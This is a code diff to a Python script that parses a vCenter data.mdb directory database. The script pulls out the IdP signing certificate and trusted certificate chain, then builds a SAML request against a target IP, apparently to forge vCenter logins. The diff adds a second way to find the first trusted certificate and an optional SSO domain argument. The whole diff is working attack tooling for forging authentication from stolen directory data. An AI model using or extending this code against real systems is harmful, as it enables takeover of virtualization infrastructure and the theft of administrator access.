@@ -23,7 +23,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 session = requests.Session()
 
 idp_cert_flag = b'\x30\x82'
-trusted_cert1_flag = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-1,cn=TrustedCertificateChains,
+trusted_cert1_flag1 = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-1,cn=TrustedCertificateChains,
+trusted_cert1_flag2 = idp_cert_flag
 trusted_cert2_flag = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31' # \x01\x00\x12TrustedCertChain-1
 not_it_list = [b'Engineering', b'California', b'object']
 
@@ -163,53 +164,67 @@ def get_domain_from_cn(cn):
     return domain
 
 
-def get_trusted_cert1(stream, verbose=False):
-    tup = stream.findall(trusted_cert1_flag)
-    matches = list(tup)
-    if matches:
-        for match in matches:
-            stream.pos = match
-            if verbose:
-                print(f'[!] Looking for cert 1 at position: {match}')
+def get_trusted_cert1_pem(stream, verbose=False):
+    # Get TrustedCertificate1 pem 1
+    cert1_size_hex = stream.read('bytes:2')
+    cert1_size = int(cert1_size_hex.hex(), 16)
+    cert1_bytes = stream.read(f'bytes:{cert1_size}')
+    if verbose:
+        print(f'[!] Cert 1 size: {cert1_size}')
 
-            cn_end = stream.readto('0x000013', bytealigned=True)
-            cn_end_pos = stream.pos
-            if verbose:
-                print(f'[!] CN end position: {cn_end_pos}')
+    if b'ssoserverSign' not in cert1_bytes:
+        if verbose:
+            print('[!] Cert does not contain ssoserverSign - keep looking')
+        return 
 
-            stream.pos = match
-            cn_len = int((cn_end_pos - match - 8) / 8)
-            cn = stream.read(f'bytes:{cn_len}').decode()
-            domain = get_domain_from_cn(cn)
-            if domain:
-                print(f'[*] CN: {cn}')
-                print(f'[*] Domain: {domain}')
-            else:
-                print(f'[!] Failed parsing domain from CN')
-                sys.exit()
+    if not check_cert_valid(cert1_bytes):
+        return 
+    cert1 = writepem(cert1_bytes, verbose)
 
-            cn = stream.readto(f'0x0002', bytealigned=True)
+    print('[*] Successfully extracted trusted certificate 1')
+    return cert1
 
-            # Get TrustedCertificate1 pem 1
-            cert1_size_hex = stream.read('bytes:2')
-            cert1_size = int(cert1_size_hex.hex(), 16)
-            cert1_bytes = stream.read(f'bytes:{cert1_size}')
-            if verbose:
-                print(f'[!] Cert 1 size: {cert1_size}')
 
-            if b'ssoserverSign' not in cert1_bytes:
+def get_trusted_cert1(stream, domain_lookup=True, verbose=False):
+    if domain_lookup:
+        tup = stream.findall(trusted_cert1_flag1)
+        matches = list(tup)
+        if matches:
+            for match in matches:
+                stream.pos = match
                 if verbose:
-                    print('[!] Cert does not contain ssoserverSign - keep looking')
-                continue
-      
-            if not check_cert_valid(cert1_bytes):
-                continue
-            cert1 = writepem(cert1_bytes, verbose)
+                    print(f'[!] Looking for cert 1 at position: {match}')
 
-            print('[*] Successfully extracted trusted certificate 1')
-            return cert1, domain
+                cn_end = stream.readto('0x000013', bytealigned=True)
+                cn_end_pos = stream.pos
+                if verbose:
+                    print(f'[!] CN end position: {cn_end_pos}')
+
+                stream.pos = match
+                cn_len = int((cn_end_pos - match - 8) / 8)
+                cn = stream.read(f'bytes:{cn_len}').decode()
+                domain = get_domain_from_cn(cn)
+                if domain:
+                    print(f'[*] CN: {cn}')
+                    print(f'[*] Domain: {domain}')
+                else:
+                    print(f'[!] Failed parsing domain from CN')
+                    sys.exit()
+
+                stream.readto(f'0x0002', bytealigned=True)
+                cert1 = get_trusted_cert1_pem(stream)
+                if cert1 is not None:
+                    return cert1, domain
     else:
-        print(f'[-] Failed to find the trusted certificate 1 flags')
+        tup = stream.findall(trusted_cert1_flag2)
+        matches = list(tup)
+        if matches:
+            for match in matches:
+                stream.pos = match - 16
+                cert1 = get_trusted_cert1_pem(stream)
+                if cert1 is not None:
+                    return cert1
+    print(f'[-] Failed to find the trusted certificate 1')
 
 
 def get_trusted_cert2(stream, verbose=False):
@@ -384,6 +399,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-p', '--path', help='The path to the data.mdb file', required=True)
     parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
+    parser.add_argument('-d', '--domain', help='vCenter SSO domain')
     parser.add_argument('-v', '--verbose', action='store_true', help='Print the extracted certificates')
     args = parser.parse_args()
 
@@ -391,7 +407,11 @@ if __name__ == '__main__':
     in_stream = open(args.path, 'rb')
     bin_stream = bitstring.ConstBitStream(in_stream)
     idp_cert = get_idp_cert(bin_stream, args.verbose)
-    trusted_cert_1, domain = get_trusted_cert1(bin_stream, args.verbose)
+    if args.domain is None:
+        trusted_cert_1, domain = get_trusted_cert1(bin_stream, domain_lookup=True, verbose=args.verbose)
+    else:
+        trusted_cert_1 = get_trusted_cert1(bin_stream, domain_lookup=False, verbose=args.verbose)
+        domain = args.domain
     trusted_cert_2 = get_trusted_cert2(bin_stream, args.verbose)
 
     # Generate SAML request
